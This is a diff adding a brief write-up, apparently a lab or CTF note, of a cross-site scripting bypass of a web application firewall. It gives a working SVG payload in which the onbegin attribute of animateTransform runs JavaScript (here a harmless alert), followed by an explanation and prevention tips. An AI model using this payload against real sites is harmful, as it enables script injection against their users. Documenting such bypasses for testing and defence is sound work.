@@ -1,0 +1,23 @@
+Vulnerability:
+	The WAF fails to sanitize SVG animation elements and their event-related attributes.
+	Specifically, it does not block the onbegin attribute in <animateTransform>,
+	Allowing an attacker to inject and run JS.
+	
+Exploit:
+	More readable:
+		<svg>
+			<circle cx="50" cy="50" r="20" fill="red" />
+			<animatetransform attributeName="r" from="20" to="20" dur="0.1s" begin="0s" onbegin="alert('lol')" />
+		</svg>
+	
+	Exploit Script:
+		<svg><circle cx="50" cy="50" r="20" fill="red" /><animatetransform attributeName="r" from="20" to="20" dur="0.1s" begin="0s" onbegin="alert('lol')"/>
+	
+Explanation:
+	- The WAF permits <svg>, <circle>, and <animateTransform>.
+	- onbegin is an event attribute triggered when the animation starts.
+	- Here, animation begins immediately (begin="0s"), and onbegin executes the JavaScript payload.
+	
+Prevention:
+	- validate all SVG elements and attributes on user input
+	- Block "<" ">" or Encode every special char before viewing the input on the page.
